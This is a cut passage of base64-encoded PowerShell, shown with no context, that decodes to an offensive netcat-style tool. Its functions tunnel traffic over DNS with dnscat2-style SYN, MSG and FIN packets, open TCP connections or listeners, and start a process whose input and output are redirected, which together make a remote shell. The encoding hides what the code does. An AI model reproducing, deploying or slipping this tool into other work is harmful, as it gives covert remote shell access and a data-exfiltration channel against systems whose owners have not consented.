JuIChbcmVnZXhdOjpNYXRjaCgkcmVzdWx0LnJlcGxhY2UoImJpbz0iLCIiKSwnKD88PSIpW14iXSooPz0iKScpLlZhbHVlKX0NCiAgICAgIGVsc2V7cmV0dXJuIDF9DQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIENyZWF0ZV9TWU4NCiAgICB7DQogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJFRhZywkRG9tYWluKQ0KICAgICAgcmV0dXJuICgkVGFnICsgKFtzdHJpbmddKEdldC1SYW5kb20gLU1heGltdW0gOTk5OSAtTWluaW11bSAxMDAwKSkgKyAiMDAiICsgJFNlc3Npb25JZCArICRTZXFOdW0gKyAiMDAwMCIgKyAkRG9tYWluKQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBDcmVhdGVfRklODQogICAgew0KICAgICAgcGFyYW0oJFNlc3Npb25JZCwkVGFnLCREb21haW4pDQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMiIgKyAkU2Vzc2lvbklkICsgIjAwIiArICREb21haW4pDQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIENyZWF0ZV9NU0cNCiAgICB7DQogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJEFja25vd2xlZGdlbWVudE51bWJlciwkRGF0YSwkVGFnLCREb21haW4pDQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMSIgKyAkU2Vzc2lvbklkICsgJFNlcU51bSArICRBY2tub3dsZWRnZW1lbnROdW1iZXIgKyAkRGF0YSArICREb21haW4pDQogICAgfQ0KICAgIA0KICAgIGZ1bmN0aW9uIERlY29kZVBhY2tldA0KICAgIHsNCiAgICAgIHBhcmFtKCRQYWNrZXQpDQogICAgICANCiAgICAgIGlmKCgoJFBhY2tldC5MZW5ndGgpJTIgLWVxIDEpIC1vciAoJFBhY2tldC5MZW5ndGggLWVxIDApKXtyZXR1cm4gMX0NCiAgICAgICRBY2tub3dsZWRnZW1lbnROdW1iZXIgPSAoJFBhY2tldFsxMC4uMTNdIC1qb2luICIiKQ0KICAgICAgJFNlcU51bSA9ICgkUGFja2V0WzE0Li4xN10gLWpvaW4gIiIpDQogICAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpDQogICAgICANCiAgICAgIGlmKCRQYWNrZXQuTGVuZ3RoIC1ndCAxOCkNCiAgICAgIHsNCiAgICAgICAgJFBhY2tldEVsaW0gPSAkUGFja2V0LlN1YnN0cmluZygxOCkNCiAgICAgICAgd2hpbGUoJFBhY2tldEVsaW0uTGVuZ3RoIC1ndCAwKQ0KICAgICAgICB7DQogICAgICAgICAgJFJldHVybmluZ0RhdGEgKz0gW2J5dGVbXV1bQ29udmVydF06OlRvSW50MTYoKCRQYWNrZXRFbGltWzAuLjFdIC1qb2luICIiKSwxNikNCiAgICAgICAgICAkUGFja2V0RWxpbSA9ICRQYWNrZXRFbGltLlN1YnN0cmluZygyKQ0KICAgICAgICB9DQogICAgICB9DQogICAgICANCiAgICAgIHJldHVybiAkUGFja2V0LCRSZXR1cm5pbmdEYXRhLCRBY2tub3dsZWRnZW1lbnROdW1iZXIsJFNlcU51bQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBBY2tub3dsZWRnZURhdGENCiAgICB7DQogICAgICBwYXJhbSgkUmV0dXJuaW5nRGF0YSwkQWNrbm93bGVkZ2VtZW50TnVtYmVyKQ0KICAgICAgJEhleCA9IFtzdHJpbmddKCJ7MDp4fSIgLWYgKChbdWludDE2XSgiMHgiICsgJEFja25vd2xlZGdlbWVudE51bWJlcikgKyAkUmV0dXJuaW5nRGF0YS5MZW5ndGgpICUgNjU1MzUpKQ0KICAgICAgaWYoJEhleC5MZW5ndGggLW5lIDQpeyRIZXggPSAoKCIwIiooNC0kSGV4Lkxlbmd0aCkpICsgJEhleCl9DQogICAgICByZXR1cm4gJEhleA0KICAgIH0NCiAgICAkRnVuY1ZhcnMgPSBAe30NCiAgICAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdLCRGdW5jVmFyc1siRG9tYWluIl0sJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0gPSAkRnVuY1NldHVwVmFycw0KICAgIGlmKCRGdW5jVmFyc1siRE5TUG9ydCJdIC1lcSAnJyl7JEZ1bmNWYXJzWyJETlNQb3J0Il0gPSAiNTMifQ0KICAgICRGdW5jVmFyc1siVGFnIl0gPSAiIg0KICAgICRGdW5jVmFyc1siRG9tYWluIl0gPSAoIi4iICsgJEZ1bmNWYXJzWyJEb21haW4iXSkNCiAgICANCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9TWU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX1NZTn0NCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX01TR30NCiAgICAkRnVuY1ZhcnNbIkNyZWF0ZV9GSU4iXSA9ICR7ZnVuY3Rpb246Q3JlYXRlX0ZJTn0NCiAgICAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdID0gJHtmdW5jdGlvbjpEZWNvZGVQYWNrZXR9DQogICAgJEZ1bmNWYXJzWyJDb252ZXJ0VG8tSGV4QXJyYXkiXSA9ICR7ZnVuY3Rpb246Q29udmVydFRvLUhleEFycmF5fQ0KICAgICRGdW5jVmFyc1siQWNrRGF0YSJdID0gJHtmdW5jdGlvbjpBY2tub3dsZWRnZURhdGF9DQogICAgJEZ1bmNWYXJzWyJTZW5kUGFja2V0Il0gPSAke2Z1bmN0aW9uOlNlbmRQYWNrZXR9DQogICAgJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSA9IChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpDQogICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9IChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpDQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQogICAgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdID0gMA0KICAgIA0KICAgICRTWU5QYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfU1lOIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sJEZ1bmNWYXJzWyJTZXFOdW0iXSwkRnVuY1ZhcnNbIlRhZyJdLCRGdW5jVmFyc1siRG9tYWluIl0pKQ0KICAgICRSZXNwb25zZVBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFNZTlBhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSkNCiAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUmVzcG9uc2VQYWNrZXQpKQ0KICAgIGlmKCREZWNvZGVkUGFja2V0IC1lcSAxKXtyZXR1cm4gIkJhZCBTWU4gcmVzcG9uc2UuIEVuc3VyZSB5b3VyIHNlcnZlciBpcyBzZXQgdXAgY29ycmVjdGx5LiJ9DQogICAgJFJldHVybmluZ0RhdGEgPSAkRGVjb2RlZFBhY2tldFsxXQ0KICAgIGlmKCRSZXR1cm5pbmdEYXRhIC1uZSAiIil7JEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIifQ0KICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQ0KICAgICRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSA9ICgyNDQgLSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sJEZ1bmNWYXJzWyJTZXFOdW0iXSwkRnVuY1ZhcnNbIkFja051bSJdLCIiLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkpLkxlbmd0aCkNCiAgICBpZigkRnVuY1ZhcnNbIk1heE1TR0RhdGFTaXplIl0gLWxlIDApe3JldHVybiAiRG9tYWluIG5hbWUgaXMgdG9vIGxvbmcuIn0NCiAgICByZXR1cm4gJEZ1bmNWYXJzDQogIH0NCiAgZnVuY3Rpb24gUmVhZERhdGFfRE5TDQogIHsNCiAgICBwYXJhbSgkRnVuY1ZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgIA0KICAgICRQYWNrZXRzRGF0YSA9IEAoKQ0KICAgICRQYWNrZXREYXRhID0gIiINCiAgICANCiAgICBpZigkRnVuY1ZhcnNbIklucHV0RGF0YSJdIC1uZSAkbnVsbCkNCiAgICB7DQogICAgICAkSGV4ID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ29udmVydFRvLUhleEFycmF5Il0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siSW5wdXREYXRhIl0pKQ0KICAgICAgJFNlY3Rpb25Db3VudCA9IDANCiAgICAgICRQYWNrZXRDb3VudCA9IDANCiAgICAgIGZvcmVhY2goJENoYXIgaW4gJEhleCkNCiAgICAgIHsNCiAgICAgICAgaWYoJFNlY3Rpb25Db3VudCAtZ2UgMzApDQogICAgICAgIHsNCiAgICAgICAgICAkU2VjdGlvbkNvdW50ID0gMA0KICAgICAgICAgICRQYWNrZXREYXRhICs9ICIuIg0KICAgICAgICB9DQogICAgICAgIGlmKCRQYWNrZXRDb3VudCAtZ2UgKCRGdW5jVmFyc1siTWF4TVNHRGF0YVNpemUiXSkpDQogICAgICAgIHsNCiAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEuVHJpbUVuZCgiLiIpDQogICAgICAgICAgJFBhY2tldENvdW50ID0gMA0KICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwDQogICAgICAgICAgJFBhY2tldERhdGEgPSAiIg0KICAgICAgICB9DQogICAgICAgICRQYWNrZXREYXRhICs9ICRDaGFyDQogICAgICAgICRTZWN0aW9uQ291bnQgKz0gMg0KICAgICAgICAkUGFja2V0Q291bnQgKz0gMg0KICAgICAgfQ0KICAgICAgJFBhY2tldERhdGEgPSAkUGFja2V0RGF0YS5UcmltRW5kKCIuIikNCiAgICAgICRQYWNrZXRzRGF0YSArPSAkUGFja2V0RGF0YQ0KICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIiDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAkUGFja2V0c0RhdGEgPSBAKCIiKQ0KICAgIH0NCiAgICANCiAgICBbYnl0ZVtdXSRSZXR1cm5pbmdEYXRhID0gQCgpDQogICAgZm9yZWFjaCgkUGFja2V0RGF0YSBpbiAkUGFja2V0c0RhdGEpDQogICAgew0KICAgICAgdHJ5eyRNU0dQYWNrZXQgPSBJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkNyZWF0ZV9NU0ciXSAtQXJndW1lbnRMaXN0IEAoJEZ1bmNWYXJzWyJTZXNzaW9uSWQiXSwkRnVuY1ZhcnNbIlNlcU51bSJdLCRGdW5jVmFyc1siQWNrTnVtIl0sJFBhY2tldERhdGEsJEZ1bmNWYXJzWyJUYWciXSwkRnVuY1ZhcnNbIkRvbWFpbiJdKX0NCiAgICAgIGNhdGNoeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gY3JlYXRlIHBhY2tldC4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9DQogICAgICB0cnl7JFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJE1TR1BhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSl9DQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbGVkIHRvIHNlbmQgcGFja2V0LiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0NCiAgICAgIHRyeQ0KICAgICAgew0KICAgICAgICAkRGVjb2RlZFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIkRlY29kZVBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkUGFja2V0KSkNCiAgICAgICAgaWYoJERlY29kZWRQYWNrZXQuTGVuZ3RoIC1uZSA0KXsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiI7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQ0KICAgICAgICAkRnVuY1ZhcnNbIkFja051bSJdID0gJERlY29kZWRQYWNrZXRbMl0NCiAgICAgICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9ICREZWNvZGVkUGFja2V0WzNdDQogICAgICAgICRSZXR1cm5pbmdEYXRhICs9ICREZWNvZGVkUGFja2V0WzFdDQogICAgICB9DQogICAgICBjYXRjaHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0NCiAgICAgIGlmKCREZWNvZGVkUGFja2V0IC1lcSAxKXsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0NCiAgICB9DQogICAgDQogICAgaWYoJEZ1bmNWYXJzWyJGYWlsdXJlcyJdIC1nZSAkRnVuY1ZhcnNbIkZhaWx1cmVUaHJlc2hvbGQiXSl7YnJlYWt9DQogICAgDQogICAgaWYoJFJldHVybmluZ0RhdGEgLW5lIEAoKSkNCiAgICB7DQogICAgICAkRnVuY1ZhcnNbIkFja051bSJdID0gKEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQWNrRGF0YSJdIC1Bcmd1bWVudExpc3QgQCgkUmV0dXJuaW5nRGF0YSwkRnVuY1ZhcnNbIkFja051bSJdKSkNCiAgICB9DQogICAgcmV0dXJuICRSZXR1cm5pbmdEYXRhLCRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMNCiAgew0KICAgIHBhcmFtKCREYXRhLCRGdW5jVmFycykNCiAgICAkRnVuY1ZhcnNbIklucHV0RGF0YSJdID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkNCiAgICByZXR1cm4gJEZ1bmNWYXJzDQogIH0NCiAgZnVuY3Rpb24gQ2xvc2VfRE5TDQogIHsNCiAgICBwYXJhbSgkRnVuY1ZhcnMpDQogICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCRGdW5jVmFyc1siVGFnIl0sJEZ1bmNWYXJzWyJEb21haW4iXSkNCiAgICBJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJEZJTlBhY2tldCwkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCRGdW5jVmFyc1siRE5TUG9ydCJdKSB8IE91dC1OdWxsDQogIH0NCiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjDQogIA0KICAjIyMjIyMjIyMjIFRDUCBGVU5DVElPTlMgIyMjIyMjIyMjIw0KICBmdW5jdGlvbiBTZXR1cF9UQ1ANCiAgew0KICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQ0KICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMNCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9DQogICAgJEZ1bmNWYXJzID0gQHt9DQogICAgaWYoISRsKQ0KICAgIHsNCiAgICAgICRGdW5jVmFyc1sibCJdID0gJEZhbHNlDQogICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50DQogICAgICBXcml0ZS1WZXJib3NlICJDb25uZWN0aW5nLi4uIg0KICAgICAgJEhhbmRsZSA9ICRTb2NrZXQuQmVnaW5Db25uZWN0KCRjLCRwLCRudWxsLCRudWxsKQ0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgJEZ1bmNWYXJzWyJsIl0gPSAkVHJ1ZQ0KICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gKHBvcnQgIiArICRwICsgIikiKQ0KICAgICAgJFNvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcExpc3RlbmVyICRwDQogICAgICAkU29ja2V0LlN0YXJ0KCkNCiAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQWNjZXB0VGNwQ2xpZW50KCRudWxsLCAkbnVsbCkNCiAgICB9DQogICAgDQogICAgJFN0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQ0KICAgIHdoaWxlKCRUcnVlKQ0KICAgIHsNCiAgICAgIGlmKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkNCiAgICAgIHsNCiAgICAgICAgaWYoQCgxNywyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpDQogICAgICAgIHsNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJDVFJMIG9yIEVTQyBjYXVnaHQuIFN0b3BwaW5nIFRDUCBTZXR1cC4uLiINCiAgICAgICAgICBpZigkRnVuY1ZhcnNbImwiXSl7JFNvY2tldC5TdG9wKCl9DQogICAgICAgICAgZWxzZXskU29ja2V0LkNsb3NlKCl9DQogICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICAgICAgICBicmVhaw0KICAgICAgICB9DQogICAgICB9DQogICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkNCiAgICAgIHsNCiAgICAgICAgaWYoISRsKXskU29ja2V0LkNsb3NlKCl9DQogICAgICAgIGVsc2V7JFNvY2tldC5TdG9wKCl9DQogICAgICAgICRTdG9wd2F0Y2guU3RvcCgpDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRpbWVvdXQhIiA7IGJyZWFrDQogICAgICAgIGJyZWFrDQogICAgICB9DQogICAgICBpZigkSGFuZGxlLklzQ29tcGxldGVkKQ0KICAgICAgew0KICAgICAgICBpZighJGwpDQogICAgICAgIHsNCiAgICAgICAgICB0cnkNCiAgICAgICAgICB7DQogICAgICAgICAgICAkU29ja2V0LkVuZENvbm5lY3QoJEhhbmRsZSkNCiAgICAgICAgICAgICRTdHJlYW0gPSAkU29ja2V0LkdldFN0cmVhbSgpDQogICAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRTb2NrZXQuUmVjZWl2ZUJ1ZmZlclNpemUNCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJDb25uZWN0aW9uIHRvICIgKyAkYyArICI6IiArICRwICsgIiBbdGNwXSBzdWNjZWVkZWQhIikNCiAgICAgICAgICB9DQogICAgICAgICAgY2F0Y2h7JFNvY2tldC5DbG9zZSgpOyAkU3RvcHdhdGNoLlN0b3AoKTsgYnJlYWt9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgJENsaWVudCA9ICRTb2NrZXQuRW5kQWNjZXB0VGNwQ2xpZW50KCRIYW5kbGUpDQogICAgICAgICAgJFN0cmVhbSA9ICRDbGllbnQuR2V0U3RyZWFtKCkNCiAgICAgICAgICAkQnVmZmVyU2l6ZSA9ICRDbGllbnQuUmVjZWl2ZUJ1ZmZlclNpemUNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICgiQ29ubmVjdGlvbiBmcm9tIFsiICsgJENsaWVudC5DbGllbnQuUmVtb3RlRW5kUG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyArICJdIHBvcnQgIiArICRwb3J0ICsgIiBbdGNwXSBhY2NlcHRlZCAoc291cmNlIHBvcnQgIiArICRDbGllbnQuQ2xpZW50LlJlbW90ZUVuZFBvaW50LlBvcnQgKyAiKSIpDQogICAgICAgIH0NCiAgICAgICAgYnJlYWsNCiAgICAgIH0NCiAgICB9DQogICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICBpZigkU29ja2V0IC1lcSAkbnVsbCl7YnJlYWt9DQogICAgJEZ1bmNWYXJzWyJTdHJlYW0iXSA9ICRTdHJlYW0NCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gJFNvY2tldA0KICAgICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdID0gJEJ1ZmZlclNpemUNCiAgICAkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0gPSAoTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdKQ0KICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwgJG51bGwsICRudWxsKQ0KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgICRGdW5jVmFyc1siU3RyZWFtQnl0ZXNSZWFkIl0gPSAxDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFJlYWREYXRhX1RDUA0KICB7DQogICAgcGFyYW0oJEZ1bmNWYXJzKQ0KICAgICREYXRhID0gJG51bGwNCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbUJ5dGVzUmVhZCJdIC1lcSAwKXticmVha30NCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkNCiAgICB7DQogICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTdHJlYW0iXS5FbmRSZWFkKCRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdKQ0KICAgICAgaWYoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9DQogICAgICAkRGF0YSA9ICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RyZWFtQnl0ZXNSZWFkLTEpXQ0KICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAkbnVsbCwgJG51bGwpDQogICAgfQ0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBXcml0ZURhdGFfVENQDQogIHsNCiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpDQogICAgJEZ1bmNWYXJzWyJTdHJlYW0iXS5Xcml0ZSgkRGF0YSwgMCwgJERhdGEuTGVuZ3RoKQ0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBDbG9zZV9UQ1ANCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICB0cnl7JEZ1bmNWYXJzWyJTdHJlYW0iXS5DbG9zZSgpfQ0KICAgIGNhdGNoe30NCiAgICBpZigkRnVuY1ZhcnNbImwiXSl7JEZ1bmNWYXJzWyJTb2NrZXQiXS5TdG9wKCl9DQogICAgZWxzZXskRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCl9DQogIH0NCiAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX0NNRA0KICB7DQogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgICRGdW5jVmFycyA9IEB7fQ0KICAgICRQcm9jZXNzU3RhcnRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbw0KICAgICRQcm9jZXNzU3RhcnRJbmZvLkZpbGVOYW1lID0gJEZ1bmNTZXR1cFZhcnNbMF0NCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkRmFsc2UNCiAgICAkUHJvY2Vzc1N0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkVHJ1ZQ0KICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSAkVHJ1ZQ0KICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9ICRUcnVlDQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0gPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkUHJvY2Vzc1N0YXJ0SW5mbykNCiAgICBXcml0ZS1WZXJib3NlICgiU3RhcnRpbmcgUHJvY2VzcyAiICsgJEZ1bmNTZXR1cFZhcnNbMF0gKyAiLi4uIikNCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFydCgpIHwgT3V0LU51bGwNCiAgICAkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYNCiAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkNCiAgICAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYNCiAgICAkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQ0KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBSZWFkRGF0YV9DTUQNCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICBbYnl0ZVtdXSREYXRhID0gQCgpDQogICAgaWYoJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpDQogICAgew0KICAgICAgJFN0ZE91dEJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSkNCiAgICAgIGlmKCRTdGRPdXR